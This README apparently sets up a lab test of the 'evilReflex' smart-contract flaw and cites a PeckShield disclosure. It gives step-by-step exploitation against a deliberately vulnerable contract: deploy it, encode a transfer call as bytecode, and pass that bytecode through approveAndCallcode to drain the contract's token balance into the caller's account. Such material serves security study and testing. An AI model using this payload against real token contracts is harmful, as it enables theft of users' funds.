## What's this?

This is a simple test for evilReflex vulnerablility in smart constract.

## How to test?

##### Step 1：compile evilReflex.sol 

##### Step 2：deploy HACKME

eg:

```
Account Address： 0x62ba0a06ffc1d0a706172e1ed755b9b91f53a617
balance: 10090000000000000000000000

Contract address： 0x26336eb6761d7c6ac28251d5e20f63623fc16ad5
balance: 10090000000000000000000000
```

##### Step 3：encode 

transfer(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4,10090000000000000000000000) to bytecode like 0xa9059cbb0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc40000000000000000000000000000000000000000000858a3fefb18d88e400000

##### Step 4：call approveAndCallcode function and pass the following parameters:

```
approveAndCallcode(
    0xf8e81D47203A594245E36C48e151709F0C19fBe8,
    0,
    0xa9059cbb0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc40000000000000000000000000000000000000000000858a3fefb18d88e400000
 )
```

##### Step 5：Check your own account assets and you will find that the assets have increased and the contract assets have changed to zero.

#### Referer

https://blog.peckshield.com/2018/06/23/evilReflex/